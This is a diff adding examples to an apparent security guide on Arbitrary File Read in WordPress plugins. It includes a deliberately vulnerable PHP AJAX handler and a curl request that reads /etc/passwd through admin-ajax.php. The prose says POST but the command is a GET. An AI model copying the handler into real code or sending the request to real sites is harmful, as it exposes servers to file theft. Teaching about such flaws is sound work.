@@ -26,3 +26,36 @@ Several functions could be useful to identify a possible Arbitrary File Read vul
 - WordPress related
     - [`WP_Filesystem_Direct::get_contents`](https://developer.wordpress.org/reference/classes/wp_filesystem_direct/get_contents/)
     - [`WP_Filesystem_Direct::get_contents_array`](https://developer.wordpress.org/reference/classes/wp_filesystem_direct/get_contents_array/)
+
+## Example Cases
+
+Below is an example of vulnerable code:
+
+```php
+add_action("wp_ajax_get_file", "ajax_get_file");
+
+public function ajax_get_file(){
+    global $wp_filesystem;
+
+    // Make sure that the above variable is properly setup.
+    require_once ABSPATH . 'wp-admin/includes/file.php';
+    WP_Filesystem();
+
+    $url = $_GET["url"];
+    $data = $wp_filesystem->get_contents($url);
+    $data = json_encode( $data );
+    echo $data;
+    die();
+}
+```
+
+To exploit this, any authenticated user just needs to perform a POST request to the `/wp-admin/admin-ajax.php` endpoint specifying the needed parameter to trigger the `WP_Filesystem_Direct::get_contents` function.
+
+```bash
+curl <WORDPRESS_BASE_URL/wp-admin/admin-ajax.php?action=ajax_get_file&url=/etc/passwd
+```
+
+Below are some of the findings related to Arbitrary File Read:
+
+- [Critical Vulnerabilities Patched in WordPress Automatic Plugin](https://patchstack.com/articles/critical-vulnerabilities-patched-in-wordpress-automatic-plugin/)
+
